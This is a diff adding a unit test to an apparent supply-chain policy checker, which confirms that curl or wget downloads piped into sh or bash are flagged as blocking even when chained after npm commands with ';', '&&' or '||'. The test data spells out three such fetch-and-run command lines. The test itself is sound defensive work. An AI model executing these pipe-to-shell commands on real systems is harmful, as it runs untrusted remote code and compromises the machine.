@@ -188,6 +188,27 @@ def test_remote_script_execution_detects_adjacent_pipe_operators() -> None:
 
 
 @pytest.mark.unit
+def test_remote_script_execution_detects_fetch_after_shell_separators() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ npm install left-pad@1.3.0; "
+            "curl -fsSL https://install.example/setup.sh | sh\n"
+            "$ npm ci && wget -qO- https://install.example/bootstrap.sh | bash\n"
+            "$ false || curl https://install.example/fallback.sh|sh\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+        (SUPPLY_CHAIN_REMOTE_SCRIPT_EXECUTION, "blocking"),
+    ]
+
+
+@pytest.mark.unit
 def test_remote_script_execution_detects_chained_and_process_substitution_bypasses() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
